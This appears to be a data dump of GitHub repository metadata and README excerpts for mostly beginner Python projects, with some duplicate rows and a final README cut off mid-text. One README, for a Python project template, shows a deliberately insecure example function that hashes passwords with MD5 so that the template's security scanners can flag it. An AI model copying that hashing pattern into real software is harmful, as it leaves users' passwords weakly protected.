417581560;Basic_python;https://github.com/AmanPratap14/Basic_python;;2021-10-15T17:23:43Z;0;0;0;
417581705;EjerciciosPython;https://github.com/abbyl66/EjerciciosPython;;2021-10-15T17:24:16Z;0;0;0;EjerciciosPython 
417649111;EstudosPython;https://github.com/Luca-Lana/EstudosPython;;2021-10-15T22:06:09Z;0;0;0;Estudos Python  Repositório Dedicado aos meus estudos de Python  
417571774;python_Algorithm;https://github.com/Danesnote/python_Algorithm;Jupyter Notebook;2021-10-15T16:47:22Z;0;0;0;
417667219;python-homework;https://github.com/juliannehiew/python-homework;;2021-10-15T23:49:33Z;0;0;0;python-homework 
417610952;Python-Files;https://github.com/satapathypriyanka090/Python-Files;Python;2021-10-15T19:19:31Z;1;1;1;"CoronaSafe Engineering Fellowship Test Problem Thanks for applying to the CoronaSafe Engineering fellowship! In this step we want to see how you implement a command-line (CLI) program that lets you manage your todos. The specification for this problem is written down as tests. Since we haven’t actually implemented anything, the tests are currently failing. You have to solve the problem by implementing the application and getting all the tests to pass. Here's how it should work when you're done:  Getting started   Install Python: Python is usually installed by default on most modern systems. To check what your currently have, open a terminal and run the following command: python3 --version  This should output some information on the installed Python version. You can also install python by following these instructions: https://installpython3.com/   You are expected to write the code in todo.py file.   Once you are done with the changes you should be able to execute the todo app by running the following command from the terminal. On Windows: .\todo.bat  On *nix: ./todo.sh    Run Automated Tests 1. Install Node.js You need to have npm installed in your computer for this problem. It comes with Node.js and you can get it by installing Node from https://nodejs.org/en/ 2. Install dependencies Run npm install to install all dependencies. 3. Create Create symbolic link to the executable file On Windows To create a symbolic link on Windows, you'll need to run either the Windows Command Prompt, or Windows Powershell with administrator privileges. To do so, right-click on the icon for Command Prompt, or Powershell, and choose the ""Run as Administrator"" option. Command Prompt: > mklink todo todo.bat  Powershell: > cmd /c mklink todo todo.bat  On *nix: Run the following command in your shell: $ ln -s todo.sh todo  4. Try running tests. Now run npm test and you will see all the tests failing. As you fill in each functionality, you can re-run the tests to see them passing one by one. A Note about / for Windows Users In the following sections, you'll see many commands prefixed with ./, or paths containing the / (forward-slash) character. If you're using the Windows Command Prompt, then you'll need to replace / with \ (back-slash) for these commands and paths to work as expected. On Windows Powershell, these substitutions are not required. Known Issues A few notes to help you avoid any hiccups while implementing the programming challenge:   If you are on Windows, you might have difficulty getting the tests to pass because of newline UTF encoding issues. If you get stuck, please refer to the thread here.   The tests can fail between 12am and 5.30am (early morning IST). This is because the test parses the date from your system time in UTC format, while in certain programming languages the date and time functions use the local timezone (IST). Accounting for this in the tests will make it more complex and need extra dependencies, so we have kept it intentionally simple. So if you run into this specific problem, you can submit your code as is with the transient date mismatch, or you can change your code to use UTC. Either options are fine.   In Windows machines, the make command might not exist and can prevent you from running the tests. This can be fixed by using WSL, or installing MinGW, among other options.   Specification   The app can be run in the console with ./todo.   The app should read from and write to a todo.txt text file. Each todo item occupies a single line in this file. Here is an example file that has 2 todo items.   water the plants change light bulb    When a todo item is completed, it should be removed from todo.txt and instead added to the done.txt text file. This file has a different format: x 2020-06-12 the text contents of the todo item   the letter x the current date (UTC/GMT) in yyyy-mm-dd format the original text  The date when the todo is marked as completed is recorded in the yyyy-mm-dd format (ISO 8601). For example, a date like 15th August, 2020 is represented as 2020-08-15.   The application must open the files todo.txt and done.txt from where the app is run, and not where the app is located. For example, if we invoke the app like this: $ cd /path/to/plans $ /path/to/apps/todo ls  The application should look for the text files in /path/to/plans, since that is the user’s current directory.   Usage 1. Help Executing the command without any arguments, or with a single argument help prints the CLI usage. $ ./todo help Usage :- $ ./todo add ""todo item""  # Add a new todo $ ./todo ls               # Show remaining todos $ ./todo del NUMBER       # Delete a todo $ ./todo done NUMBER      # Complete a todo $ ./todo help             # Show usage $ ./todo report           # Statistics  2. List all pending todos Use the ls command to see all the todos that are not yet complete. The most recently added todo should be displayed first. $ ./todo ls [2] change light bulb [1] water the plants  3. Add a new todo Use the add command. The text of the todo item should be enclosed within double quotes (otherwise only the first word is considered as the todo text, and the remaining words are treated as different arguments). $ ./todo add ""the thing i need to do"" Added todo: ""the thing i need to do""  4. Delete a todo item Use the del command to remove a todo item by its number. $ ./todo del 3 Deleted todo #3  Attempting to delete a non-existent todo item should display an error message. $ ./todo del 5 Error: todo #5 does not exist. Nothing deleted.  5. Mark a todo item as completed Use the done command to mark a todo item as completed by its number. $ ./todo done 1 Marked todo #1 as done.  Attempting to mark a non-existed todo item as completed will display an error message. $ ./todo done 5 Error: todo #5 does not exist.  6. Generate a report Use the report command to see the latest tally of pending and completed todos. $ ./todo report yyyy-mm-dd Pending : 1 Completed : 4  Improving README.md If you feel like we are missing out steps, feel free to make a pull request. Github Repo "
417621207;python-ai;https://github.com/thereal-atom/python-ai;Python;2021-10-15T20:03:57Z;0;0;0;python-ml Some basic python code using numpy and sklearn 
417630382;python-books;https://github.com/harshmeet-1029/python-books;;2021-10-15T20:44:52Z;0;0;0;python-books 
417571823;Python-Tutorials;https://github.com/rishav1808/Python-Tutorials;Jupyter Notebook;2021-10-15T16:47:32Z;0;0;0;
417576795;function-python;https://github.com/StephanieTayo/function-python;Jupyter Notebook;2021-10-15T17:05:17Z;0;0;0;function-python working with functions and variables 
417595201;Python-Programming-;https://github.com/mst-sarkar/Python-Programming-;;2021-10-15T18:15:48Z;0;0;0;
417658346;exercises-python;https://github.com/Rob30Garcia/exercises-python;Python;2021-10-15T22:57:26Z;0;0;0;
417661582;python_challange;https://github.com/SanuliLohara/python_challange;Python;2021-10-15T23:17:22Z;0;0;0;python_challange 
417649486;python_begins;https://github.com/danilavida/python_begins;Python;2021-10-15T22:07:46Z;0;0;0;Primeros Proyectos Python 
417635205;OOP_Python;https://github.com/adrianaroxana/OOP_Python;Python;2021-10-15T21:02:58Z;0;0;0;OOP_Python 
417614978;cursoPython;https://github.com/JunioResende/cursoPython;Python;2021-10-15T19:36:43Z;0;0;0;
417649675;python-hello;https://github.com/jtuliani/python-hello;Python;2021-10-15T22:08:33Z;0;0;0;
417652257;Python_treina;https://github.com/m0ippan/Python_treina;Python;2021-10-15T22:21:21Z;0;0;0;
417642971;Python_Exercises;https://github.com/KatarzynaMialkowska/Python_Exercises;Python;2021-10-15T21:35:46Z;0;0;0;
417580446;Python-Programming;https://github.com/SanjeevKumarPrajapati/Python-Programming;;2021-10-15T17:19:19Z;0;0;0;Python-Programming Internship Notes 
417610952;Python-Files;https://github.com/satapathypriyanka090/Python-Files;Python;2021-10-15T19:19:31Z;1;1;1;"CoronaSafe Engineering Fellowship Test Problem Thanks for applying to the CoronaSafe Engineering fellowship! In this step we want to see how you implement a command-line (CLI) program that lets you manage your todos. The specification for this problem is written down as tests. Since we haven’t actually implemented anything, the tests are currently failing. You have to solve the problem by implementing the application and getting all the tests to pass. Here's how it should work when you're done:  Getting started   Install Python: Python is usually installed by default on most modern systems. To check what your currently have, open a terminal and run the following command: python3 --version  This should output some information on the installed Python version. You can also install python by following these instructions: https://installpython3.com/   You are expected to write the code in todo.py file.   Once you are done with the changes you should be able to execute the todo app by running the following command from the terminal. On Windows: .\todo.bat  On *nix: ./todo.sh    Run Automated Tests 1. Install Node.js You need to have npm installed in your computer for this problem. It comes with Node.js and you can get it by installing Node from https://nodejs.org/en/ 2. Install dependencies Run npm install to install all dependencies. 3. Create Create symbolic link to the executable file On Windows To create a symbolic link on Windows, you'll need to run either the Windows Command Prompt, or Windows Powershell with administrator privileges. To do so, right-click on the icon for Command Prompt, or Powershell, and choose the ""Run as Administrator"" option. Command Prompt: > mklink todo todo.bat  Powershell: > cmd /c mklink todo todo.bat  On *nix: Run the following command in your shell: $ ln -s todo.sh todo  4. Try running tests. Now run npm test and you will see all the tests failing. As you fill in each functionality, you can re-run the tests to see them passing one by one. A Note about / for Windows Users In the following sections, you'll see many commands prefixed with ./, or paths containing the / (forward-slash) character. If you're using the Windows Command Prompt, then you'll need to replace / with \ (back-slash) for these commands and paths to work as expected. On Windows Powershell, these substitutions are not required. Known Issues A few notes to help you avoid any hiccups while implementing the programming challenge:   If you are on Windows, you might have difficulty getting the tests to pass because of newline UTF encoding issues. If you get stuck, please refer to the thread here.   The tests can fail between 12am and 5.30am (early morning IST). This is because the test parses the date from your system time in UTC format, while in certain programming languages the date and time functions use the local timezone (IST). Accounting for this in the tests will make it more complex and need extra dependencies, so we have kept it intentionally simple. So if you run into this specific problem, you can submit your code as is with the transient date mismatch, or you can change your code to use UTC. Either options are fine.   In Windows machines, the make command might not exist and can prevent you from running the tests. This can be fixed by using WSL, or installing MinGW, among other options.   Specification   The app can be run in the console with ./todo.   The app should read from and write to a todo.txt text file. Each todo item occupies a single line in this file. Here is an example file that has 2 todo items.   water the plants change light bulb    When a todo item is completed, it should be removed from todo.txt and instead added to the done.txt text file. This file has a different format: x 2020-06-12 the text contents of the todo item   the letter x the current date (UTC/GMT) in yyyy-mm-dd format the original text  The date when the todo is marked as completed is recorded in the yyyy-mm-dd format (ISO 8601). For example, a date like 15th August, 2020 is represented as 2020-08-15.   The application must open the files todo.txt and done.txt from where the app is run, and not where the app is located. For example, if we invoke the app like this: $ cd /path/to/plans $ /path/to/apps/todo ls  The application should look for the text files in /path/to/plans, since that is the user’s current directory.   Usage 1. Help Executing the command without any arguments, or with a single argument help prints the CLI usage. $ ./todo help Usage :- $ ./todo add ""todo item""  # Add a new todo $ ./todo ls               # Show remaining todos $ ./todo del NUMBER       # Delete a todo $ ./todo done NUMBER      # Complete a todo $ ./todo help             # Show usage $ ./todo report           # Statistics  2. List all pending todos Use the ls command to see all the todos that are not yet complete. The most recently added todo should be displayed first. $ ./todo ls [2] change light bulb [1] water the plants  3. Add a new todo Use the add command. The text of the todo item should be enclosed within double quotes (otherwise only the first word is considered as the todo text, and the remaining words are treated as different arguments). $ ./todo add ""the thing i need to do"" Added todo: ""the thing i need to do""  4. Delete a todo item Use the del command to remove a todo item by its number. $ ./todo del 3 Deleted todo #3  Attempting to delete a non-existent todo item should display an error message. $ ./todo del 5 Error: todo #5 does not exist. Nothing deleted.  5. Mark a todo item as completed Use the done command to mark a todo item as completed by its number. $ ./todo done 1 Marked todo #1 as done.  Attempting to mark a non-existed todo item as completed will display an error message. $ ./todo done 5 Error: todo #5 does not exist.  6. Generate a report Use the report command to see the latest tally of pending and completed todos. $ ./todo report yyyy-mm-dd Pending : 1 Completed : 4  Improving README.md If you feel like we are missing out steps, feel free to make a pull request. Github Repo "
417667219;python-homework;https://github.com/juliannehiew/python-homework;;2021-10-15T23:49:33Z;0;0;0;python-homework 
417571774;python_Algorithm;https://github.com/Danesnote/python_Algorithm;Jupyter Notebook;2021-10-15T16:47:22Z;0;0;0;
417571823;Python-Tutorials;https://github.com/rishav1808/Python-Tutorials;Jupyter Notebook;2021-10-15T16:47:32Z;0;0;0;
417630668;Python_notes;https://github.com/syeonkoh/Python_notes;;2021-10-15T20:45:47Z;0;0;0;Python_notes 
417643633;Lira-Python;https://github.com/Hudson-Isr/Lira-Python;Python;2021-10-15T21:39:28Z;0;0;0;Lira-Python 
417652483;Python-Projects;https://github.com/Acher0ns/Python-Projects;Python;2021-10-15T22:22:31Z;0;0;0;
417582482;projetos_python;https://github.com/eudesfran/projetos_python;;2021-10-15T17:27:17Z;0;0;0;
417582846;pythonify_3;https://github.com/ken437/pythonify_3;Kotlin;2021-10-15T17:28:42Z;0;0;0;"pythonify_3    Template ToDo list   Create a new IntelliJ Platform Plugin Template project.  Get known with the template documentation.  Verify the pluginGroup, plugin ID and sources package.  Review the Legal Agreements.  Publish a plugin manually for the first time.  Set the Plugin ID in the above README badges.  Set the Deployment Token.  Click the Watch button on the top of the IntelliJ Platform Plugin Template to be notified about releases containing new features and fixes.  This Fancy IntelliJ Platform Plugin is going to be your implementation of the brilliant ideas that you have. This specific section is a source for the plugin.xml file which will be extracted by the Gradle during the build process. To keep everything working, do not remove <!-- ... --> sections. Installation   Using IDE built-in plugin system: Settings/Preferences > Plugins > Marketplace > Search for ""pythonify_3"" > Install Plugin   Manually: Download the latest release and install it manually using Settings/Preferences > Plugins > ⚙️ > Install plugin from disk...    Plugin based on the IntelliJ Platform Plugin Template. "
417573982;Geekbrains_Python;https://github.com/DavidFreeman78/Geekbrains_Python;;2021-10-15T16:55:21Z;0;0;0;
417580016;agenda_python;https://github.com/giopizzighini/agenda_python;Python;2021-10-15T17:17:36Z;0;0;0;
417642634;Python-OOP;https://github.com/vuongbui/Python-OOP;;2021-10-15T21:34:02Z;0;0;0;Python-OOP Learn about Object Oriented Programming with Python 
417579924;curso-python;https://github.com/robson036/curso-python;Python;2021-10-15T17:17:16Z;0;0;0;"Curso Python Sexta-feira: 14 horas Ambiente Python  Interpretador Ambienda em C que executa o código em tempo real IDE PIP VirtualEnv  Tipagem logico: bool = True / False inteiro: int = 12 string: str = ""imposto é roubo"" decimal: float = 3.14 "
417607723;Learning-Python;https://github.com/smctech999/Learning-Python;Python;2021-10-15T19:06:22Z;0;0;0;
417585015;Python-Programming;https://github.com/ivanovskyi/Python-Programming;Python;2021-10-15T17:36:51Z;0;0;0;Python Programming MOOC 2021 https://programming-21.mooc.fi/ 
417565435;Python-basics;https://github.com/manojcsathreya/Python-basics;;2021-10-15T16:23:48Z;0;0;0;
417602403;python_projects;https://github.com/hazal-usta/python_projects;Jupyter Notebook;2021-10-15T18:44:31Z;0;0;0;python_projects Data visualization charts and code as well as game codes with python 
417583144;Udemy-Python;https://github.com/wandywahidin/Udemy-Python;Python;2021-10-15T17:29:56Z;0;0;0;Udemy-Python Pelajaran Fundamental Python Udemy ini adalah project pertama saya dengan python wohooo!! with SSH 
417559601;python-test;https://github.com/Kostyan89/python-test;;2021-10-15T16:03:45Z;0;0;0;Cool Flask App I developed this project because i can handle these:  python Flask MVC API  
417660719;python_sessions;https://github.com/pedrovelasquez9/python_sessions;Python;2021-10-15T23:11:59Z;0;0;0;
417663187;cgi-python;https://github.com/Aymannagyahmed/cgi-python;Shell;2021-10-15T23:26:58Z;0;0;0;cgi-python 
417576795;function-python;https://github.com/StephanieTayo/function-python;Jupyter Notebook;2021-10-15T17:05:17Z;0;0;0;function-python working with functions and variables 
417652257;Python_treina;https://github.com/m0ippan/Python_treina;Python;2021-10-15T22:21:21Z;0;0;0;
417649675;python-hello;https://github.com/jtuliani/python-hello;Python;2021-10-15T22:08:33Z;0;0;0;
417649486;python_begins;https://github.com/danilavida/python_begins;Python;2021-10-15T22:07:46Z;0;0;0;Primeros Proyectos Python 
417658346;exercises-python;https://github.com/Rob30Garcia/exercises-python;Python;2021-10-15T22:57:26Z;0;0;0;
417635205;OOP_Python;https://github.com/adrianaroxana/OOP_Python;Python;2021-10-15T21:02:58Z;0;0;0;OOP_Python 
417595201;Python-Programming-;https://github.com/mst-sarkar/Python-Programming-;;2021-10-15T18:15:48Z;0;0;0;
417661582;python_challange;https://github.com/SanuliLohara/python_challange;Python;2021-10-15T23:17:22Z;0;0;0;python_challange 
417614978;cursoPython;https://github.com/JunioResende/cursoPython;Python;2021-10-15T19:36:43Z;0;0;0;
417642971;Python_Exercises;https://github.com/KatarzynaMialkowska/Python_Exercises;Python;2021-10-15T21:35:46Z;0;0;0;
417612773;python-newsfeed;https://github.com/JustinWeicht/python-newsfeed;;2021-10-15T19:27:18Z;0;0;0;python-newsfeed 
417616905;Exercicios-Python;https://github.com/hstabelin/Exercicios-Python;;2021-10-15T19:45:36Z;0;0;0;
417624507;python-pong;https://github.com/hadook/python-pong;Python;2021-10-15T20:19:24Z;0;0;0;
417639340;PYTHON-PROJECT;https://github.com/liyah15/PYTHON-PROJECT;;2021-10-15T21:19:25Z;0;0;0;
417631406;python-ex;https://github.com/GuilhermeNeres/python-ex;Python;2021-10-15T20:48:20Z;0;0;0;
417566739;Python-Learning;https://github.com/Chief-Aathil/Python-Learning;;2021-10-15T16:28:35Z;0;0;0;Python learning codes Following python tutorial. 
417651255;Python_fizzbuzz;https://github.com/ManlyBanana/Python_fizzbuzz;Python;2021-10-15T22:16:26Z;1;1;0;
417585821;Python-Scripts;https://github.com/Vaibhav6200/Python-Scripts;Python;2021-10-15T17:39:57Z;0;0;0;
417601338;zabbix_python;https://github.com/mrhankey911/zabbix_python;Python;2021-10-15T18:40:11Z;0;0;0;zabbix_python Python script for zabbix-agents 
417583809;Projetos_python;https://github.com/eudessena/Projetos_python;Python;2021-10-15T17:32:20Z;0;0;0;
417567415;Python-Strings;https://github.com/skfreego/Python-Strings;Python;2021-10-15T16:31:02Z;0;0;0;"Python Strings HackerRank Challenges Domain:Python Sub Domain:Strings Swap Case For Example: Www.HackerRankSolution.in → wWW.hACKERrANKsOLUTION.IN Pythonist 2 → pYTHONIST 2 String Split and Join In Python, a string can be split on a delimiter. Example: >>> a = ""this is a string"" >>> a = a.split("" "") # a is converted to a list of strings. >>> print a ['this', 'is', 'a', 'string'] Joining a string is simple: >>> a = ""-"".join(a) >>> print a this-is-a-string What's Your Name? Mutations We have seen that lists are mutable (they can be changed), and tuples are immutable (they cannot be changed). Let's try to understand this with an example. You are given an immutable string, and you want to make changes to it. Example: >>> string = ""abracadabra"" You can access an index by: >>> print string[5] a What if you would like to assign a value? >>> string[5] = 'k' Traceback (most recent call last): File """", line 1, in  TypeError: 'str' object does not support item assignment How would you approach this? One solution is to convert the string to a list and then change the value. Example:    string = ""abracadabra"" l = list(string) l[5] = 'k' string = ''.join(l) print string abrackdabra Another approach is to slice the string and join it back. Example: string = string[:5] + ""k"" + string[6:] print string abrackdabra    Find a String In this challenge, the user enters a string and a substring. NOTE: String letters are case-sensitive. String Validators Python has built-in string validation methods for basic data. It can check if a string is composed of alphabetical characters, alphanumeric characters, digits, etc. str.isalnum() This method checks if all the characters of a string are alphanumeric (a-z, A-Z and 0-9).    print 'ab123'.isalnum() True print 'ab123#'.isalnum() False    str.isalpha() This method checks if all the characters of a string are alphabetical (a-z and A-Z).    print 'abcD'.isalpha() True print 'abcd1'.isalpha() False    str.isdigit() This method checks if all the characters of a string are digits (0-9).    print '1234'.isdigit() True print '123edsd'.isdigit() False    str.islower() This method checks if all the characters of a string are lowercase characters (a-z).    print 'abcd123#'.islower() True print 'Abcd123#'.islower() False    str.isupper() This method checks if all the characters of a string are uppercase characters (A-Z).    print 'ABCD123#'.isupper() True print 'Abcd123#'.isupper() False    Text Alignment In Python, a string of text can be aligned left, right and center. .ljust(width) This method returns a left aligned string of length width.    width = 20 print 'HackerRank'.ljust(width,'-') HackerRank----------    .center(width) This method returns a centered string of length width.    width = 20 print 'HackerRank'.center(width,'-') -----HackerRank----       .rjust(width) This method returns a right aligned string of length width.    width = 20 print 'HackerRank'.rjust(width,'-') ----------HackerRank    Text Wrap You are given a string S and width w. Designer Door Mat Mr. Vincent works in a door mat manufacturing company. One day, he designed a new door mat with the following specifications:  1. Mat size must be MXN. (N is an odd natural number, and M is 3 times N.)  2. The design should have 'WELCOME' written in the center.   3. The design pattern should only use |, . and - characters.  Sample Designs: Size: 7 x 21  ---------.|.--------- ------.|..|..|.------ ---.|..|..|..|..|.--- -------WELCOME------- ---.|..|..|..|..|.--- ------.|..|..|.------ ---------.|.---------  Size: 11 x 33 ---------------.|.--------------- ------------.|..|..|.------------ ---------.|..|..|..|..|.--------- ------.|..|..|..|..|..|..|.------ ---.|..|..|..|..|..|..|..|..|.--- -------------WELCOME------------- ---.|..|..|..|..|..|..|..|..|.--- ------.|..|..|..|..|..|..|.------ ---------.|..|..|..|..|.--------- ------------.|..|..|.------------ ---------------.|.---------------  String Formatting Given an integer, n, print the following values for each integer i from 1 to n:  1. Decimal  2. Octal  3. Hexadecimal (capitalized)  4. Binary  The four values must be printed on a single line in the order specified above for each i from 1 to n. Each value should be space-padded to match the width of the binary value of n. Alphabet Rangoli You are given an integer, N. Your task is to print an alphabet rangoli of size N. (Rangoli is a form of Indian folk art based on creation of patterns.) Different sizes of alphabet rangoli are shown below: #size 3 ----c---- --c-b-c-- c-b-a-b-c --c-b-c-- ----c---- #size 5 --------e-------- ------e-d-e------ ----e-d-c-d-e---- --e-d-c-b-c-d-e-- e-d-c-b-a-b-c-d-e --e-d-c-b-c-d-e-- ----e-d-c-d-e---- ------e-d-e------ --------e-------- #size 10 ------------------j------------------ ----------------j-i-j---------------- --------------j-i-h-i-j-------------- ------------j-i-h-g-h-i-j------------ ----------j-i-h-g-f-g-h-i-j---------- --------j-i-h-g-f-e-f-g-h-i-j-------- ------j-i-h-g-f-e-d-e-f-g-h-i-j------ ----j-i-h-g-f-e-d-c-d-e-f-g-h-i-j---- --j-i-h-g-f-e-d-c-b-c-d-e-f-g-h-i-j-- j-i-h-g-f-e-d-c-b-a-b-c-d-e-f-g-h-i-j --j-i-h-g-f-e-d-c-b-c-d-e-f-g-h-i-j-- ----j-i-h-g-f-e-d-c-d-e-f-g-h-i-j---- ------j-i-h-g-f-e-d-e-f-g-h-i-j------ --------j-i-h-g-f-e-f-g-h-i-j-------- ----------j-i-h-g-f-g-h-i-j---------- ------------j-i-h-g-h-i-j------------ --------------j-i-h-i-j-------------- ----------------j-i-j---------------- ------------------j------------------ The center of the rangoli has the first alphabet letter a, and the boundary has the Nth alphabet letter (in alphabetical order). Capitalize! You are asked to ensure that the first and last names of people begin with a capital letter in their passports. For example, alison heck should be capitalised correctly as Alison Heck. alison heck => Alison Heck Given a full name, your task is to capitalize the name appropriately. The Minion Game Kevin and Stuart want to play the 'The Minion Game'. Game Rules Both players are given the same string, S. Both players have to make substrings using the letters of the string S. Stuart has to make words starting with consonants. Kevin has to make words starting with vowels. The game ends when both players have made all possible substrings. Scoring A player gets +1 point for each occurrence of the substring in the string S. For Example: String S = BANANA Kevin's vowel beginning word = ANA Here, ANA occurs twice in BANANA. Hence, Kevin will get 2 Points. Merge the Tools! Consider the following:  1. A string, s, of length  where s=c0,c1.....cn-1.  2. An integer, k, where k is a factor of n.  We can split s into n/k subsegments where each subsegment, ti, consists of a contiguous block of k characters in s. Then, use each ti to create string ui such that:   1. The characters in ui are a subsequence of the characters in ti.   2. Any repeat occurrence of a character is removed from the string such that each character in ui         occurs exactly once. In other words, if the character at some index j in ti occurs at a previous         index <j in ti, then do not include the character in string ui.  Given s and k, print n/k lines where each line  denotes string ui. "
417666613;python-televisao;https://github.com/gacarvalho/python-televisao;Python;2021-10-15T23:46:00Z;0;0;0;python-televisao 
417592829;python_calc;https://github.com/mj434/python_calc;Dockerfile;2021-10-15T18:06:52Z;0;0;0;
417588239;pythonify_4;https://github.com/ken437/pythonify_4;Kotlin;2021-10-15T17:49:31Z;0;0;0;"pythonify_4    Template ToDo list   Create a new IntelliJ Platform Plugin Template project.  Get known with the template documentation.  Verify the pluginGroup, plugin ID and sources package.  Review the Legal Agreements.  Publish a plugin manually for the first time.  Set the Plugin ID in the above README badges.  Set the Deployment Token.  Click the Watch button on the top of the IntelliJ Platform Plugin Template to be notified about releases containing new features and fixes.  This Fancy IntelliJ Platform Plugin is going to be your implementation of the brilliant ideas that you have. This specific section is a source for the plugin.xml file which will be extracted by the Gradle during the build process. To keep everything working, do not remove <!-- ... --> sections. Installation   Using IDE built-in plugin system: Settings/Preferences > Plugins > Marketplace > Search for ""pythonify_4"" > Install Plugin   Manually: Download the latest release and install it manually using Settings/Preferences > Plugins > ⚙️ > Install plugin from disk...    Plugin based on the IntelliJ Platform Plugin Template. "
417623386;Learning-Python;https://github.com/Zim-Zuck/Learning-Python;;2021-10-15T20:14:08Z;0;0;0;
417608940;UdemyPython;https://github.com/Priyaroy1589/UdemyPython;Jupyter Notebook;2021-10-15T19:10:47Z;0;0;0;
417635290;Cursos-python;https://github.com/Hudson-Isr/Cursos-python;Python;2021-10-15T21:03:18Z;0;0;0;Cursos-python 
417587916;python-projects;https://github.com/mitaliarora1908/python-projects;;2021-10-15T17:48:09Z;0;0;0;python-projects 
417599805;Python-Projects;https://github.com/anshul-X-07/Python-Projects;Jupyter Notebook;2021-10-15T18:33:47Z;0;0;0;Python-Projects Some Python Project implemented in jupyter notebook 
417592129;Python-Projects;https://github.com/TanmayProgrammer-13/Python-Projects;;2021-10-15T18:04:04Z;0;0;0;
417618182;python-newsfeed;https://github.com/Imaparadox/python-newsfeed;;2021-10-15T19:51:10Z;0;0;0;python-newsfeed 
417624263;python_iot;https://github.com/d986000777/python_iot;;2021-10-15T20:18:11Z;0;0;0;
417606194;Python_Code;https://github.com/luiserp/Python_Code;Python;2021-10-15T19:00:43Z;0;0;0;Python Code. Ejemplos de codigos en python, sus distintos modos de implementar y utilizar. Este es un proyecto en desarrollo. 
417596239;Python-software-dev-3006-;https://github.com/Abby-w/Python-software-dev-3006-;Python;2021-10-15T18:20:04Z;0;0;0;
417559827;python_Quiz_game;https://github.com/setab/python_Quiz_game;Python;2021-10-15T16:04:31Z;0;0;0;
417633962;sentiment-analysis-with-python;https://github.com/pratik3848/sentiment-analysis-with-python;Python;2021-10-15T20:58:21Z;0;0;0;    Sentiment Analysis With Python      An application to know the sentiment of any sentence!      Table of Contents   About The Project  Built With    Getting Started  Installation   Contributing Contact Acknowledgements   About The Project  People use sentences to express their feelings, some may be sarcastic, some may be positive, some of them can be negative as well as neutral. I found it interesting to develop a tool which can figure out the type of sentence and here we are! Here's why:  To apply python sentiment analysis cncept in real life To learn how python libraries contribute in sentiment analysis To understand the concept and usage of Flask in application To ease the process of analyzing entity wise sentiment from huge number of senetences which is manually unfeasible Not the least, to work upon data apply the concepts of python for data science  Of course, there is much more to dive deep in sentiment analysis as well as data world. So I'll be adding more in the near future. You may also suggest changes by forking this repo and creating a pull request or opening an issue. Thanks to all the people have have contributed to expanding this project! A list of commonly used resources that I find helpful are listed in the acknowledgements. Built With  Python for Data Science Flask Sentiment Analysis  Getting Started This is an example of how you may give instructions on setting up your project locally. To get a local copy up and running follow these simple example steps. Installation 1.Install Python on your machine depending upon OS https://realpython.com/installing-python/ 2. Clone the repository 3. Install NPM packages npm install 4.Install Flask and other libraries required Contributing Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are greatly appreciated.  Fork the Project Create your Feature Branch (git checkout -b feature/AmazingFeature) Commit your Changes (git commit -m 'Add some AmazingFeature') Push to the Branch (git push origin feature/AmazingFeature) Open a Pull Request  
417650365;python-skills-test;https://github.com/Thinmindt/python-skills-test;Python;2021-10-15T22:11:53Z;0;0;0;python-skills-test Basic server layout to evaluate interviewee's skills 
417617077;Class2Python;https://github.com/RemyaGeorge54/Class2Python;Python;2021-10-15T19:46:17Z;0;0;0;Class2Python Learn python, pytest and pytext cov 
417635729;Python_Flask_CRUD;https://github.com/sheena21/Python_Flask_CRUD;Python;2021-10-15T21:05:03Z;0;0;0;
417637249;python-bot-materials;https://github.com/mikh-maksi/python-bot-materials;Python;2021-10-15T21:11:22Z;0;0;0;python-bot-materials 
417588265;Tik-tak-toe-python-;https://github.com/Stornshado/Tik-tak-toe-python-;Python;2021-10-15T17:49:37Z;0;0;0;Tik-tak-toe-python- 
417575775;snake_in_python;https://github.com/szymon099/snake_in_python;Python;2021-10-15T17:01:31Z;0;0;0;
417619572;inteligencia-artificial-python;https://github.com/caiobomfs/inteligencia-artificial-python;Python;2021-10-15T19:57:20Z;0;0;0;
417640218;100daysofCodePython;https://github.com/StellaNguyen68/100daysofCodePython;Python;2021-10-15T21:22:59Z;0;0;0;
417571689;ML-with-Python;https://github.com/TaniaIncio/ML-with-Python;Jupyter Notebook;2021-10-15T16:47:01Z;0;0;0;
417613699;Python-CC-Template;https://github.com/Anthony-Sheu/Python-CC-Template;Python;2021-10-15T19:31:11Z;0;0;0;
417628918;Uber_Data_Python_Project;https://github.com/DaniChen1/Uber_Data_Python_Project;Jupyter Notebook;2021-10-15T20:39:20Z;0;0;0;In this Python project, using the Python libraries pandas, numpy, matplotlib, and seaborn, I analyze the Uber Pickups in New York City dataset. I present the number of trips during every hour, every day, every day of the week, and every month. I also use data visualization such as bar plots and heatmaps to help understand the data and develop an intuition for understanding the customers' who avail the trips. 
417628534;luxury_python_template;https://github.com/woernerm/luxury_python_template;Python;2021-10-15T20:38:07Z;0;0;0;"The Luxury Python Template       There are great tools available to automatically style, analyze and build your code. They help you deliver better products faster. However, you have to learn how they work, configure them and clean up after them. It’s easy to forgo this tedious work in the beginning when all you can think about is the bright idea behind your new python package. Will you do that later on? Probably not, because then chances are high that you get hundreds of complaints from these tools and fixing them all will likely set you back for weeks. Its way more fun to focus on new features anyway.   Writing better code would be so much easier if any new project, regardless of whether it starts out as an afternoon experiment or the next big thing, would already include all of the bells and whistles that professional packages use. For free and without having to register yourself for yet another online service.   With the luxury python template, you can have all that right from the start! It is very opinionated, meaning the only thing you have to think about is the project name. It comes with a single, zero configuration command-line tool. Its options are intentionally limited and therefore easy to remember. You get everything with a single call of: python package.py build This includes:  Installing all needed dependencies. Sorting import statements alphabetically with isort. Styling your code Black. Checking for residual style errors with Flake8. Checking for security issues with Bandit. Checking for known vulnerabilities in dependencies with Safety. Running tests with Unittest and evaluating test coverage with Coverage.py Generating documentation with Sphinx and markdown support from MySt. Checking for undocumented code (built into package.py). Generating a single, beautiful report for all of the above with Pico.css. Building wheel files and incrementing the version number according to calendar versioning. Generating badges with the most important metrics for your repository like the ones shown above. Removing temporary files and folders.  Example Report The package.py tool that comes with the template can generate a single, beautiful report that summarizes the results of the above-mentioned tools. Want an example? Have a look at the following, problematic code: import hashlib import subprocess  from flask import Flask  def getHash(password: str):     """"""     This is an example function for encrypting passwords.      Args:         pw: The password to be encrypted.     """"""     return hashlib.md5(password.encode(""utf-8"")) In this example, the code is stored in src/bad_example.py. If you run python package.py build you will get the report. Have a look! Quick Guide  The template follows the instructions of the PyPa packaging tutorial. So, it should look familiar to most people. Using the template is easy. Just click the green ""Use this template"" button above (you need to be signed into GitHub) to create your own repository with all the files automatically copied from this template. Alternatively, you may just download / clone a copy of the files. Provide some information about your project in 